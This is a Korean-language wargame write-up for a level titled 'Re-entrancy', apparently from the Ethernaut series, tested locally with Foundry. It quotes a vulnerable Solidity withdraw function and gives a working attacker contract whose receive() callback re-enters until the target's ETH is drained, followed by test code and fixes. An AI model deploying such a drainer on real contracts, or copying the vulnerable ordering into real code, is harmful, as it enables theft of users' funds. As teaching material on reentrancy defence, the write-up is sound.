# 10. Re-entrancy

[English](../en/10_Reentrancy.md) | [한국어](10_Reentrancy.md)

## 문제 목표

대상의 콜백 실행 순서를 이용해 레벨을 완료하고 ETH 잔액이 0이 되었는지 확인합니다.

## 핵심 개념

- 재진입 콜백
- Checks-Effects-Interactions
- 외부 호출 이후의 상태 갱신
- Solidity 0.6 산술 연산 동작
- `deployCode()`를 이용한 다중 버전 테스트

## 컨트랙트 분석

대상은 기록된 잔액을 확인하고 호출자에게 ETH를 보낸 다음에야 해당 잔액을 줄입니다.

```solidity
function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value: _amount}("");
        if (result) {
            _amount;
        }
        balances[msg.sender] -= _amount;
    }
}
```

저수준 호출은 실행 제어권을 `msg.sender`에게 넘깁니다. 호출자가 payable `receive()` 함수를 가진 컨트랙트라면 최초 잔액 갱신 전에 해당 함수가 실행됩니다. 콜백 중에는 대상이 이전 기록 잔액을 계속 확인하므로 추가 인출 요청을 처리합니다.

## 솔버 컨트랙트

솔버는 플레이어가 전달한 금액을 기록하고, 대상에서 자신의 잔액으로 등록한 뒤 인출을 요청합니다.

```solidity
function solve() external payable {
    amount = msg.value;
    target.donate{value: amount}(address(this));
    target.withdraw(amount);
}
```

각 콜백에서는 대상의 남은 ETH를 확인하고 설정 금액과 남은 잔액 중 작은 값을 요청합니다.

```solidity
receive() external payable {
    uint256 targetBalance = address(target).balance;

    if (targetBalance > 0) {
        uint256 toWithdraw =
            targetBalance < amount ? targetBalance : amount;
        target.withdraw(toWithdraw);
    }
}
```

작은 값을 선택하면 대상의 마지막 잔액이 원래 요청 금액보다 적은 경우도 처리할 수 있습니다.

## 풀이 흐름

로컬 시나리오에서는 별도 예치자가 먼저 0.5 ETH를 제공합니다. 이후 플레이어가 솔버를 통해 1 ETH를 제공합니다.

```text
대상 시작 잔액 = 0.5 ETH
        ↓
솔버가 1 ETH를 기록하고 제공
        ↓
대상 잔액 = 1.5 ETH
        ↓
대상이 솔버 회계를 갱신하기 전에 1 ETH 전송
        ↓
솔버 콜백이 남은 0.5 ETH 요청
        ↓
대상이 0.5 ETH 전송
        ↓
대상 잔액 = 0
솔버 잔액 = 1.5 ETH
```

원본 Solidity 0.6 산술 동작을 보존했습니다. 중첩 호출이 반환될 때 반복되는 잔액 차감이 되돌려지지 않고 순환할 수 있으므로 구버전 컴파일러 유지가 이 재현에서도 중요합니다.

## Foundry 테스트

대상은 Solidity 0.6을 유지하고 테스트와 솔버는 Solidity 0.8을 사용합니다. 솔버 파일의 최소 인터페이스로 컴파일러 의존 그래프를 분리합니다.

```solidity
interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256);
    function withdraw(uint256 _amount) external;
}
```

테스트는 `deployCode()`로 구버전 artifact를 배포합니다.

```solidity
target = IReentrance(
    deployCode("10_Reentrancy.sol:Reentrance")
);
```

이후 두 최종 잔액을 함께 검증합니다.

```solidity
vm.prank(player);
solver.solve{value: 1 ether}();

assertEq(address(target).balance, 0);
assertEq(address(solver).balance, 1.5 ether);
```

## 문제의 근본 원인

컨트랙트가 호출자의 회계 상태를 갱신하기 전에 외부 상호작용을 수행합니다. 콜백은 앞선 실행이 이전 잔액을 관찰하는 동안 `withdraw()`를 다시 호출할 수 있습니다.

## 권장 개선 방법

- Checks-Effects-Interactions 순서에 따라 ETH 전송 전에 기록 잔액을 줄입니다.
- 외부 콜백을 피할 수 없는 함수에는 재진입 방지 장치를 사용합니다.
- 가능한 경우 풀 방식 정산을 사용합니다.
- 저수준 호출 결과를 확인하고 명확한 커스텀 에러를 사용합니다.
- 콜백을 가진 수신자와 중첩 실행 경로를 테스트합니다.
- 최신 구현에서는 Solidity 0.8 또는 검사된 산술 연산을 사용하되, 산술 검사만으로 올바른 호출 순서를 대신할 수 없다는 점을 기억합니다.

## 테스트 실행

```bash
forge test --match-path test/10_Reentrancy.t.sol -vvv
```

전체 콜백 추적을 확인하려면:

```bash
forge test --match-path test/10_Reentrancy.t.sol -vvvv
```

## 학습 정리

외부 호출은 실행 제어권을 전달합니다. 제어권을 넘기기 전에 보안상 중요한 회계 상태를 갱신하고, 모든 수신자 콜백이 컨트랙트를 다시 호출할 수 있다고 가정해야 합니다.
